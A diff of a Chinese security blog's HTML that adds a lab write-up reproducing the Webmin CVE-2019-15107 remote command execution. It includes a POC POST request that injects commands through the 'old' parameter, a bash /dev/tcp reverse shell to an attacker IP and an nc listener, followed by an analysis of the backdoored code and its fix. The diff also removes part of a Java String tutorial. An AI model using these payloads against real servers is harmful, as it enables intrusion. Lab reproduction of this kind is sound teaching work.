@@ -134,6 +134,155 @@
     
     
     <article
+  id="post-三CVE-2019-15107：Webmin-RCE复现"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/"
+    >三CVE-2019-15107：Webmin RCE复现</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-04-28T07:04:04.000Z" itemprop="datePublished">2021-04-28</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="0X00-漏洞概述"><a href="#0X00-漏洞概述" class="headerlink" title="0X00 漏洞概述"></a>0X00 漏洞概述</h1><p>​    Webmin是一个基于Web的界面，用于Unix的系统管理。使用任何支持表和表单的浏览器，可以设置用户帐户，Apache，DNS，文件共享等。</p>
+<p>​    2019年8月10日，在pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。</p>
+<p>​    该漏洞由于<code>password_change.cgi</code>文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是sourceforge上某些版本的安装包和源码被植入了后门导致的。</p>
+<h1 id="0X01-影响版本"><a href="#0X01-影响版本" class="headerlink" title="0X01 影响版本"></a>0X01 影响版本</h1><p>Webmin&lt;=1.920</p>
+<h1 id="0X02-环境搭建"><a href="#0X02-环境搭建" class="headerlink" title="0X02 环境搭建"></a>0X02 环境搭建</h1><h2 id="一、靶场虚拟机中安装好docker和vulhub"><a href="#一、靶场虚拟机中安装好docker和vulhub" class="headerlink" title="一、靶场虚拟机中安装好docker和vulhub"></a>一、靶场虚拟机中安装好docker和vulhub</h2><p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/charon1937/p/13757124.html">详细安装</a>    如果已经有docker，只需克隆vulhub</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%85%8B%E9%9A%86.png"></p>
+<h2 id="二、安装完成后，切换到指定漏洞目录"><a href="#二、安装完成后，切换到指定漏洞目录" class="headerlink" title="二、安装完成后，切换到指定漏洞目录"></a>二、安装完成后，切换到指定漏洞目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;webmin&#x2F;CVE-2019-15107&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、启动环境"><a href="#三、启动环境" class="headerlink" title="三、启动环境"></a>三、启动环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%90%AF%E5%8A%A8.png"></p>
+<h2 id="四、访问ip端口（手动输入https）：https-ip-10000"><a href="#四、访问ip端口（手动输入https）：https-ip-10000" class="headerlink" title="四、访问ip端口（手动输入https）：https://ip:10000/"></a>四、访问ip端口（<strong>手动输入https</strong>）：<code>https://ip:10000/</code></h2><p>提示不安全链接时继续前往，或者忽略证书</p>
+<p>火狐</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%BF%BD%E7%95%A5%E8%AF%81%E4%B9%A6.png"></p>
+<p>成功访问</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE.png"></p>
+<h2 id="五、修改密码"><a href="#五、修改密码" class="headerlink" title="五、修改密码"></a>五、修改密码</h2><p>进入漏洞目录，docker环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it cve-2019-15107_web_1 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>修改webmin默认root账户的密码（vulhub上的镜像有修改密码功能）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;webmin</span><br><span class="line">passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81.png"></p>
+<h2 id="六、登陆，开启密码重置功能"><a href="#六、登陆，开启密码重置功能" class="headerlink" title="六、登陆，开启密码重置功能"></a>六、登陆，开启密码重置功能</h2><p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%90%AF%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE1.png"></p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%90%AF%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE2.png"></p>
+<h3 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h3><p>docker环境中的<code>/etc/webmin</code>目录下，确定<code>passwd_mode</code>的值为<code>2</code>，满足漏洞触发条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat miniserv.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E7%A1%AE%E8%AE%A4%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png"></p>
+<h2 id="七、为了方便测试，关闭SSL功能："><a href="#七、为了方便测试，关闭SSL功能：" class="headerlink" title="七、为了方便测试，关闭SSL功能："></a>七、为了方便测试，关闭SSL功能：</h2><p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%85%B3%E9%97%ADSSL.png"></p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%85%B3%E9%97%ADSSL3.png"></p>
+<p>关闭以后使用<code>http://ip:10000</code>访问，如果登陆报错清除cookie。</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E8%AE%BF%E9%97%AE%E9%94%99%E8%AF%AF.png"></p>
+<h2 id="八、创建一个新的webmin用户（漏洞触发位置）"><a href="#八、创建一个新的webmin用户（漏洞触发位置）" class="headerlink" title="八、创建一个新的webmin用户（漏洞触发位置）"></a>八、创建一个新的webmin用户（漏洞触发位置）</h2><p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B71.png"></p>
+<p><strong>勾选<code>Force change at next login </code>（触发漏洞关键）：</strong></p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B72.png"></p>
+<p>退出登录，使用刚刚创建的账号登录，可以发现跳转到了使用旧密码更改新密码的界面。</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E4%BF%AE%E6%94%B9%E7%95%8C%E9%9D%A2.png"></p>
+<p>抓包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.171.134:10000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 56</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.171.134:10000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.171.134:10000&#x2F;session_login.cgi</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user&#x3D;123456&amp;pam&#x3D;1&amp;expired&#x3D;2&amp;old&#x3D;123456&amp;new1&#x3D;123&amp;new2&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E6%8A%93%E5%8C%85.png"></p>
+<p>新密码随便填，不填命令无法执行。旧密码可以不填，也无需用<code>|</code>将密码和命令分开，可以直接执行。</p>
+<h2 id="九、漏洞验证"><a href="#九、漏洞验证" class="headerlink" title="九、漏洞验证"></a>九、漏洞验证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;123456&amp;pam&#x3D;1&amp;expired&#x3D;2&amp;old&#x3D;ls&amp;new1&#x3D;123&amp;new2&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/ls.png"></p>
+<p>漏洞验证成功，环境搭建完毕</p>
+<h1 id="0X03-POC"><a href="#0X03-POC" class="headerlink" title="0X03 POC"></a>0X03 POC</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.146:10000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:60.0) Gecko&#x2F;20100101 Firefox&#x2F;60.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 57</span><br><span class="line"></span><br><span class="line">user&#x3D;123&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;test|id&amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure>
+
+<p>POC的利用</p>
+<p>​    如果不知道用户密码，也可以直接在登陆页面抓包，将文件路径修改为<code>/password_change.cgi</code>，在<strong>正文中填入以下语句</strong>（用户名和新密码都可以随便填）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;test&amp;pam&#x3D;1&amp;expired&#x3D;2&amp;old&#x3D;执行的命令&amp;new1&#x3D;1&amp;new2&#x3D;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0X04-反弹shell"><a href="#0X04-反弹shell" class="headerlink" title="0X04 反弹shell"></a>0X04 反弹shell</h1><p>靶机ip <code>192.168.171.134</code></p>
+<p>攻击机ip <code>192.168.171.135</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.171.135&#x2F;6666 0&gt;&amp;1&quot;</span><br><span class="line">  </span><br><span class="line">url编码结果：</span><br><span class="line">bash -c %22bash -i %3E%26 %2Fdev%2Ftcp%2F192.168.171.135%2F6666 0%3E%261%22</span><br></pre></td></tr></table></figure>
+
+<p>攻击机监听命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/nc.png"></p>
+<p>抓包发送内容：</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BC%B9shell.png"></p>
+<p>成功反弹shell</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E5%8F%8D.png"></p>
+<h1 id="0X05-漏洞分析"><a href="#0X05-漏洞分析" class="headerlink" title="0X05 漏洞分析"></a>0X05 漏洞分析</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1019/#_3">详细分析</a></p>
+<p>查看<code>password_change.cgi</code>文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .. #退回至根目录</span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;webmin  #&#x2F;usr&#x2F;share&#x2F;webmin目录下有password_change.cgi文件。</span><br><span class="line">cat password_change.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png"></p>
+<p>当密码验证不正确的时候将进入<code>pass_error</code>这行代码：</p>
+<p><img src="/2021/04/28/%E4%B8%89CVE-2019-15107%EF%BC%9AWebmin-RCE%E5%A4%8D%E7%8E%B0/%E9%94%99%E8%AF%AF%E4%BB%A3%E7%A0%81.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass_error($text&#123;&#39;password_eold&#39;&#125;,qx&#x2F;$in&#123;&#39;old&#39;&#125;&#x2F;);</span><br></pre></td></tr></table></figure>
+
+<p><code>    $in&#123;&#39;old&#39;&#125;</code>即参数<code>old</code>，而且放在了<code>qx/.../</code>中，于是<code>old</code>参数的值将会被执行，而<code>old</code>可以从外部传参，就造成了命令执行漏洞。</p>
+<p>关闭镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0X06-修复建议"><a href="#0X06-修复建议" class="headerlink" title="0X06 修复建议"></a>0X06 修复建议</h1><p>webmin 1.930 修复了该漏洞，简单粗暴，去掉qx：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass_error($text&#123;&#39;password_eold&#39;&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0X07-参考文章"><a href="#0X07-参考文章" class="headerlink" title="0X07 参考文章"></a>0X07 参考文章</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1019/#_3">https://paper.seebug.org/1019/#_3</a></li>
+<li><a target="_blank" rel="noopener" href="https://shutup-sg.github.io/2021/04/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%91%A2%20Webmin%20RCE/#%E5%8F%82%E8%80%83">https://shutup-sg.github.io/2021/04/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%91%A2%20Webmin%20RCE/#%E5%8F%82%E8%80%83</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6465">https://xz.aliyun.com/t/6465</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1553936">https://cloud.tencent.com/developer/article/1553936</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/dust_hk/article/details/100046046">https://blog.csdn.net/dust_hk/article/details/100046046</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6040">https://xz.aliyun.com/t/6040</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6db98793d043">https://www.jianshu.com/p/6db98793d043</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184668#h2-2">https://www.anquanke.com/post/id/184668#h2-2</a></li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-二CVE-2019-0193：Apache-Solr远程命令执行漏洞复现"
   class="article article-type-post"
   itemscope
@@ -1941,111 +2090,6 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013378306/article/details/107741539">https://blog.csdn.net/lqzkcx3/article/details/79463450</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lqzkcx3/article/details/79463450">https://www.cnblogs.com/wxgblogs/p/5849951.html</a></p>
 <p>根据文章提到了 AES 和 加密密钥硬编码，所以需要去源码寻找密钥</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-Java-5String类"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/04/15/Java-5String%E7%B1%BB/"
-    >Java 5String类</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/04/15/Java-5String%E7%B1%BB/" class="article-date">
-  <time datetime="2021-04-15T02:55:50.000Z" itemprop="datePublished">2021-04-15</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Java/">Java</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h1><ul>
-<li>java.lang.String类对象表示不可修改的Unicode编码字符串</li>
-<li>在Java中<strong>双引号括起来的字符串也被当做String对象</strong><ul>
-<li>system.out.printIn(“abc”.length()); //输出3<br>system.out.printIn(“abc”.equals(“abc”)); //输出true</li>
-</ul>
-</li>
-</ul>
-<p><strong>Steing类的equals已被重写相等为true</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">System.out.println(str1.equals(str2)):</span><br><span class="line">___________________________</span><br><span class="line">    输出结果</span><br><span class="line">    	<span class="keyword">true</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>==号比较自身，equals比较指向内容</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str1 == str2)	<span class="comment">//是判断str1和str2自身的内容是否相等?还是用来判断str1指向的对象的内容和str2指向的对象的内容是否相等?   答：代表前者</span></span><br><span class="line">	System.out.println(<span class="string">&quot;str1 == str2&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	System.out.println(<span class="string">&quot;str1 != str2&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h2 id="String类示例内存示意图"><a href="#String类示例内存示意图" class="headerlink" title="String类示例内存示意图"></a>String类示例内存示意图</h2><p>​    <strong>字符串常量是在数据区存放</strong></p>
-<p><img src="/2021/04/15/Java-5String%E7%B1%BB/%E7%A4%BA%E6%84%8F%E5%9B%BE1.png"></p>
-<p><img src="/2021/04/15/Java-5String%E7%B1%BB/%E7%A4%BA%E6%84%8F%E5%9B%BE2.png"></p>
-<h1 id="String类的常用方法-字符串和整数的相互转化"><a href="#String类的常用方法-字符串和整数的相互转化" class="headerlink" title="String类的常用方法   字符串和整数的相互转化"></a>String类的常用方法   字符串和整数的相互转化</h1><p>常用方法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charat</span><span class="params">(<span class="keyword">int</span> index)</span>  返回字符串中第index个字符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span>  返回字符串的长度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span> <span class="params">(string str)</span>  返回字符串中出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span><span class="params">(string str,<span class="keyword">int</span> fromIndex)</span>  返回字符串中从fromIndex开始出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equalsIgnoreCase</span> <span class="params">(string another)</span>  比较字符串与another是否一样（忽略大小写)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">char</span> oldChar ,<span class="keyword">char</span> newChar)</span>  在字符串中用newchar字符替换oldchar字符</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charat</span><span class="params">(<span class="keyword">int</span> index)</span>   返回字符串中第index个字符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span>   返回字符串的长度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span> <span class="params">(string str)</span>  返回字符串中出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span><span class="params">(string str,<span class="keyword">int</span> fromIndex)</span>   返回字符串中从fromIndex开始出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equalsIgnoreCase</span> <span class="params">(string another)</span>  比较字符串与another是否一样（忽略大小写)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> string <span class="title">replace</span><span class="params">(<span class="keyword">char</span> oldChar ,<span class="keyword">char</span> newChar)</span>  在字符串中用newchar字符替换oldchar字符</span></span><br></pre></td></tr></table></figure>
-
-<p>​    静态方法 </p>
-<p>​    <code>public String[] split(String regex)</code>可以将一个字符串按照指定的分隔符分隔，返回分隔后的字符串数组。</p>
-<p>​    <code>public static String valueOf(...)</code> 可以将基本类型数据转换为字符串<strong>（字符转换）</strong></p>
-<p>例子</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSt</span> <span class="title">ring_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">123</span>;</span><br><span class="line">        String str <span class="string">&quot;456&quot;</span>;</span><br><span class="line">        <span class="comment">//str = i; //error</span></span><br><span class="line">        <span class="comment">//i = str; //error</span></span><br><span class="line">        str = String.value0f(i);</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = %s\n&quot;</span>, str);</span><br><span class="line">        </span><br><span class="line">        i = Integer.parselnt(str);</span><br><span class="line">        System.out.printf(<span class="string">&quot;i = %d\n&quot;</span>，i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>1.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;sun java&quot;</span>;</span><br><span class="line">        String s2 =<span class="string">&quot;sun Java&quot;</span>;</span><br><span class="line">        System.out.println(s1.charAt(<span class="number">1</span>)); <span class="comment">//u</span></span><br><span class="line">        System.out.println(s2.length()); <span class="comment">//8</span></span><br><span class="line">        System.out.println(s1.indexOf(<span class="string">&quot;java&quot;</span>)); <span class="comment">//4</span></span><br><span class="line">        System.out.println(s1.indexOf(<span class="string">&quot;Java&quot;</span>)); <span class="comment">//-1</span></span><br><span class="line">        System.out.println(s1.equals(s2)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(s1.equalsIgnoreCase(s2) ); <span class="comment">//true</span></span><br><span class="line">        </span><br><span class="line">        String s =<span class="string">&quot;我是程序员，我在学java&quot;</span>;</span><br><span class="line">        String sr = s.replace(<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;你&#x27;</span>);</span><br><span class="line">        System.out.println(sr); <span class="comment">//你是程序员,你在学java</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
